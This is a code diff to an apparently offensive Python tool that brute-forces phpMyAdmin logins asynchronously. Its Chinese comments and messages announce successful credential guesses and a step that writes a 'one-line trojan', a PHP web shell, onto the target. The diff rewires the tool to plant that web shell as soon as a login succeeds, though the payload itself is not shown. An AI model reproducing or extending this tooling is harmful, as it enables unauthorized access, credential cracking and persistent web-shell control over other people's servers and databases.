@@ -100,7 +100,9 @@ async def phpmyadmin_crack(host, username, password, limit):
                             if index_code == 200:
                                 if "常规设置" in index_response:
                                     print("登录成功:用户名为{u},密码为{p}".format(u=username, p=password))
-                                    return True, token_value, session
+                                    # 写入一句话木马
+                                    write_trojan_return = write_trojan(session, token_value, host)
+                                    return write_trojan_return
                                 else:
                                     return False, False
                             else:
@@ -197,9 +199,8 @@ async def async_handle_login_and_write_trojan(host, limit):
         done, pending = await asyncio.wait(tasks)
         for i in done:
             login_return = i.result()
-            if login_return[0]:
-                # 写入一句话
-                await write_trojan(login_return[2], login_return[1], host)
+            if login_return:
+                return
 
 
 def handle_login_and_write_trojan(host, limit):
